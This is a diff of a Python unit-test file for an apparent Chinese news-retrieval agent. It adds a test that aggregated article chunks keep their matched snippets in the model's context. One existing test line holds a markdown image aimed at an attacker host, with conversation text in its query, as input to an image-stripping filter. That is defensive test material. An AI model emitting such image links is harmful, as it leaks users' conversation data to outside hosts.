@@ -235,6 +235,26 @@ class AgentContractTests(unittest.TestCase):
         answer = "要点如下。![x](https://attacker.example/?q=对话) 结束 ![本地](/static/a.png)"
         self.assertEqual(agent.strip_external_images(answer), "要点如下。 结束 ![本地](/static/a.png)")
 
+    def test_aggregated_article_keeps_its_matched_chunks_for_the_model(self):
+        body = "前文铺垫。" * 40 + "核心商业区不动产收益率达到5%以上，远高于债券市场。"
+        chunks = [
+            {"id": "jjrb:x", "title": "保险资金增配不动产", "summary": "开头摘要。", "rerank_score": 0.6, "publish_ts": 0},
+            {"id": "jjrb:x", "title": "保险资金增配不动产", "summary": body, "rerank_score": 0.9, "publish_ts": 0},
+        ]
+
+        import dataclasses
+        from unittest import mock
+
+        production = dataclasses.replace(agent.settings, evidence_snippet_chars=500, evidence_chunks_per_doc=2)
+        with mock.patch.object(agent, "settings", production):
+            parent = agent._aggregate_parents(chunks, 5)[0]
+            context = agent._render_tool_context([{"tool": "retrieve_news", "items": [parent]}])
+
+        self.assertEqual(parent["snippets"][0], body)
+        self.assertIn("5%以上", context)
+        self.assertIn("开头摘要", context)
+        self.assertIn("5%以上", agent._build_evidence_pack([{"items": [parent]}])[0]["snippet"])
+
     def test_station_intent_uses_deterministic_tools_before_model_choice(self):
         calls = agent._deterministic_tool_calls("给我推荐几篇文章", user_id=42)
 
